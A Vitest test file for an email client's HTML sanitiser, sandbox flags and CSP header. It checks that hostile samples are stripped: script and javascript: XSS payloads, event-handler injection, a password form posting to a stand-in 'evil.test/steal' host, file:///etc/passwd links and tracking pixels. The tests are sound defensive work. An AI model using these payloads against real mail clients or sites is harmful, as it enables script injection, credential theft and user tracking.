// @vitest-environment jsdom
import { describe, expect, test } from "vitest";
import {
  buildMailSrcDoc,
  MAIL_FRAME_SANDBOX,
  mailFrameCsp,
  sanitizeMailHtml,
} from "../src/mail/sanitize";

const blocked = { loadRemote: false, resolveCid: () => null };
const loaded = { loadRemote: true, resolveCid: () => null };
const clean = (html: string, o = blocked) => sanitizeMailHtml(html, o);
const dom = (html: string) => {
  const d = document.implementation.createHTMLDocument("");
  d.body.innerHTML = html;
  return d.body;
};

describe("malicious HTML samples", () => {
  test("script elements and javascript: URLs are gone", () => {
    const out = clean(
      '<p>hi</p><script>alert(1)</script><a href="javascript:alert(1)">x</a><img src="javascript:alert(1)">'
    ).html;
    expect(out).not.toMatch(/script/i);
    expect(out).not.toMatch(/javascript:/i);
    expect(out).toContain("hi");
  });

  test("event handler attributes are stripped everywhere", () => {
    const out = clean(
      '<img src="data:image/png;base64,AAAA" onerror="alert(1)"><div onclick="x()" onmouseover="y()">t</div><body onload="z()">'
    ).html;
    expect(out).not.toMatch(/\son[a-z]+\s*=/i);
    expect(out).toContain("t</div>");
  });

  test("forms, inputs, buttons and form actions are removed", () => {
    const out = clean(
      '<form action="https://evil.test/steal" method="post"><input name="pw" type="password"><button formaction="https://evil.test">Go</button><textarea>t</textarea><select><option>1</option></select></form>'
    ).html;
    expect(out).not.toMatch(/<(form|input|button|textarea|select|option)\b/i);
    expect(out).not.toMatch(/action=|evil\.test/i);
  });

  test("meta refresh, base, link, iframe, object, embed are removed", () => {
    const out = clean(
      '<meta http-equiv="refresh" content="0;url=https://evil.test"><base href="https://evil.test/"><link rel="stylesheet" href="https://evil.test/x.css"><iframe src="https://evil.test"></iframe><object data="https://evil.test"></object><embed src="https://evil.test"><p>ok</p>'
    ).html;
    expect(out).not.toMatch(/<(meta|base|link|iframe|object|embed)\b/i);
    expect(out).not.toMatch(/evil\.test/);
    expect(out).toContain("ok");
  });

  test("svg and mathml (script carriers) are not allowed", () => {
    const out = clean('<svg onload="alert(1)"><script>alert(1)</script><image href="https://evil.test/a.png"/></svg><math><mi>x</mi></math>').html;
    expect(out).not.toMatch(/<(svg|math|image)\b/i);
  });

  test("DOM clobbering ids/names and data attributes are dropped", () => {
    const out = clean('<a id="x" name="y" data-track="1" href="https://ok.test/">l</a>').html;
    expect(out).not.toMatch(/\b(id|name|data-track)=/);
  });

  test("unsafe link schemes are removed; web links open in a new unrelated tab", () => {
    const body = dom(
      clean(
        '<a href="https://ok.test/a">a</a><a href="mailto:a@b.test">m</a><a href="data:text/html,<script>1</script>">d</a><a href="vbscript:x">v</a><a href="file:///etc/passwd">f</a><a href="ok" target="_self">rel</a>'
      ).html
    );
    const links = [...body.querySelectorAll("a")];
    expect(links.map((a) => a.getAttribute("href"))).toEqual([
      "https://ok.test/a",
      "mailto:a@b.test",
      null,
      null,
      null,
      null,
    ]);
    for (const a of links) {
      expect(a.getAttribute("target")).toBe("_blank");
      expect(a.getAttribute("rel")).toBe("noopener noreferrer nofollow");
    }
  });
});

describe("remote content", () => {
  const remote =
    '<img src="https://track.test/p.gif" width="1" height="1"><img src="//track.test/q.gif"><table background="https://track.test/bg.png"><tr><td style="background:url(https://track.test/s.png) no-repeat">c</td></tr></table><img src="x.png" srcset="https://track.test/a.png 2x">';

  test("blocked by default: no remote URL survives, and the sanitiser reports it", () => {
    const r = clean(remote);
    expect(r.hadRemote).toBe(true);
    expect(r.html).not.toMatch(/track\.test/);
    expect(r.html).not.toMatch(/srcset/i);
    expect(dom(r.html).querySelectorAll("img[data-blocked]").length).toBe(3);
  });

  test("loaded for this message: http(s) images and CSS urls stay, scripts still do not", () => {
    const r = clean(`${remote}<script>alert(1)</script>`, loaded);
    expect(r.hadRemote).toBe(true);
    expect(r.html).toContain("https://track.test/p.gif");
    expect(r.html).toContain("https://track.test/q.gif"); // protocol-relative -> https
    expect(r.html).toContain("https://track.test/s.png");
    expect(r.html).not.toMatch(/script/i);
    expect(r.html).not.toMatch(/srcset/i);
  });

  test("a mail without remote references is not reported as having remote content", () => {
    const r = clean('<p>plain</p><img src="data:image/png;base64,iVBORw0KGgo=">');
    expect(r.hadRemote).toBe(false);
    expect(r.html).toContain("data:image/png;base64");
  });

  test("CSS: @import, expression(), binding, escapes and image functions never survive", () => {
    const r = clean(
      '<style>@import url(https://track.test/a.css); body{background:u\\72l(https://track.test/b.png); width:expression(alert(1)); -moz-binding:url(x); background-image:image-set("https://track.test/c.png" 1x)} p{color:red}</style><p style="background:url(\'https://track.test/d.png\');color:blue">x</p>'
    );
    expect(r.html).not.toMatch(/track\.test/);
    expect(r.html).not.toMatch(/@import|expression|binding|image-set/i);
    expect(r.html).toContain("color:red");
    expect(r.html).toContain("color:blue");
    expect(r.hadRemote).toBe(true);
  });

  test("only real remote loads count: relative paths, @import and srcset are dropped without a remote notice", () => {
    expect(clean('<img src="x.png">').hadRemote).toBe(false);
    expect(clean('<img src="x.png">').html).not.toContain("x.png");
    expect(clean("<style>@import url(https://track.test/a.css); p{color:red}</style><p>x</p>").hadRemote).toBe(false);
    expect(clean('<img srcset="https://track.test/a.png 2x">').hadRemote).toBe(false);
    expect(clean('<img src="https://track.test/p.gif">').hadRemote).toBe(true);
  });

  test("data: images stay, other data: and unknown schemes in images do not", () => {
    const r = clean(
      '<img src="data:image/png;base64,iVBORw0KGgo="><img src="data:text/html;base64,PHNjcmlwdD4="><img src="data:image/svg+xml;base64,PHN2Zz4="><img src="blob:https://x/1"><img src="file:///etc/passwd">'
    ).html;
    expect(r.match(/data:image\/png/g)?.length).toBe(1);
    expect(r).not.toMatch(/text\/html|svg\+xml|blob:|file:/);
  });
});

describe("cid images", () => {
  test("resolve to the message's own attachment URL even while remote content is blocked", () => {
    const r = sanitizeMailHtml('<img src="cid:logo@fake.test"><img src="cid:missing">', {
      loadRemote: false,
      resolveCid: (id) => (id === "logo@fake.test" ? "http://localhost:8000/api/mail/x?part=0" : null),
    });
    expect(r.html).toContain("http://localhost:8000/api/mail/x?part=0");
    expect(r.hadRemote).toBe(false);
    expect(dom(r.html).querySelectorAll("img[data-blocked]").length).toBe(1);
  });
});

describe("display document", () => {
  test("the sandbox allows neither scripts, forms, same-origin nor top navigation", () => {
    for (const flag of ["allow-scripts", "allow-forms", "allow-same-origin", "allow-top-navigation", "allow-modals"])
      expect(MAIL_FRAME_SANDBOX).not.toContain(flag);
  });

  test("CSP: nothing may run or load, remote images only after loading", () => {
    const blockedCsp = mailFrameCsp(false, "http://localhost:8000");
    expect(blockedCsp).toContain("default-src 'none'");
    expect(blockedCsp).not.toMatch(/script-src|https:|http:(?!\/)/);
    expect(blockedCsp).toContain("form-action 'none'");
    expect(blockedCsp).toContain("base-uri 'none'");
    const loadedCsp = mailFrameCsp(true, "http://localhost:8000");
    expect(loadedCsp).toMatch(/img-src [^;]*https:/);
    expect(loadedCsp).not.toMatch(/script-src/);
    expect(loadedCsp).not.toMatch(/connect-src|frame-src|font-src/);
  });

  test("srcdoc puts the CSP before any mail content", () => {
    const doc = buildMailSrcDoc("<p>x</p>", false, "http://localhost:8000");
    expect(doc.indexOf("Content-Security-Policy")).toBeLessThan(doc.indexOf("<p>x</p>"));
    expect(doc.indexOf("Content-Security-Policy")).toBeLessThan(doc.indexOf("<style>"));
  });
});
